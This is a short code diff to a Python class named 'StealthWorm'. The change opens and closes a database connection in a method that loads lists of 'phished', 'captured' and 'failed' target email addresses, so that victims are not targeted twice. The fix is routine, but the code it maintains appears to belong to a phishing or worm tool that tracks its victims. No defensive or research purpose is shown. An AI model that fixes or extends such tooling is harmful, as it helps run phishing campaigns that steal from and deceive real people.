@@ -705,6 +705,8 @@ class StealthWorm:
     def _load_phished_set(self):
         """Load already phished emails from database to avoid duplicate targeting."""
         try:
+            from db import connect_db
+            conn = connect_db()
             c = conn.cursor()
             c.execute("SELECT email FROM targets WHERE status='phished'")
             for row in c.fetchall():
@@ -715,6 +717,7 @@ class StealthWorm:
             c.execute("SELECT email FROM targets WHERE status='failed'")
             for row in c.fetchall():
                 self.failed.add(row[0])
+            conn.close()
             
             logger.debug(f"Loaded {len(self.phished)} phished, {len(self.captured)} captured, {len(self.failed)} failed from DB")
         except Exception as e:
